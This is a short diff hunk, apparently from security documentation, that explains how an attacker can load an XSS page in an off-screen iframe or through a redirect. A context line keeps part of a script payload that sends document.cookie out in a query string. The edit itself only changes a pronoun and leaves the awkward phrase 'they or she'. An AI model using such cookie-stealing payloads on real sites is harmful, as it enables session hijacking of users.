@@ -123,7 +123,7 @@ the meta element's URL is wrapped for legibility):
         ?c='+encodeURIComponent(document.cookie)+'\">')</script>">
 
 The only difference is that when using an iframe, the attacker can hide
-the frame off-screen -- so the browser user won't have any idea that he
+the frame off-screen -- so the browser user won't have any idea that they
 or she just "visited" example.com. When using a redirect to navigate
 directly to example.com, the browser will display the example.com url in
 the browser's address bar, and the example.com page in the browser's
